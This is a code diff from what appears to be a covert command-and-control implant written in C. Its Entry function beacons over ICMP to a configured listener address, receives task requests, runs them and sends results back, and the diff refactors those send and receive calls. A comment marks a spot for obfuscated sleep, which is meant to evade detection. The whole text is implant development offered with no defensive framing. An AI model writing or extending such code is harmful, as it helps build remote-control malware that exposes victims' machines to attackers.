@@ -39,7 +39,6 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 	API				Api;
 	MEMORY_BASIC_INFORMATION	Mbi;
 
-	BOOL				Rcv = FALSE;
 	DWORD				Res = 0;
 	PBUFFER				Inb = NULL;
 	PBUFFER				Onb = NULL;
@@ -80,7 +79,7 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 					/* Execute "Hello" */
 					if ( TaskHello( Ctx, NULL, 0, Onb ) ) {
 						/* Change the IP to be configurable */
-						Ctx->Established = IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
+						Ctx->Established = IcmpSend( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Ctx, Onb->Buffer, Onb->Length );
 					};
 				};
 			};
@@ -100,8 +99,8 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 				/* Create an input command buffer */
 				if ( ( Inb = BufferCreate( ) ) != NULL ) {
 					/* Read in the incoming buffer */
-					if ( IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Ctx->Id, sizeof( Ctx->Id ), &Inb->Buffer, &Inb->Length, &Rcv ) ) {
-						if ( Rcv != FALSE && Inb->Buffer != NULL && Inb->Length != 0 ) {
+					if ( IcmpRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Ctx, &Inb->Buffer, &Inb->Length ) ) {
+						if ( Inb->Buffer != NULL && Inb->Length != 0 ) {
 							if ( Inb->Length >= sizeof( TASK_REQ_HDR ) ) {
 								/* Create an output buffer */
 								if ( ( Onb = BufferCreate() ) != NULL ) {
@@ -152,7 +151,7 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 													/* Abort */
 													break;
 											};
-											IcmpSendRecv( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Onb->Buffer, Onb->Length, NULL, NULL, NULL );
+											IcmpSend( C_PTR( G_PTR( ICMP_LISTENER_ADDRESS ) ), Ctx, Onb->Buffer, Onb->Length );
 										};
 									}
 									/* Cleanup */
@@ -171,7 +170,7 @@ D_SEC( B ) VOID WINAPI Entry( VOID )
 					Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Inb );
 
 					/* Reset variables */
-					Inb = NULL; Rcv = FALSE;
+					Inb = NULL;
 				};
 				/* ah shit!: insert obfuscate/sleep call here */
 				/* OBFUSCATe SLEEP IMPLEMENTATION GOES HERE */
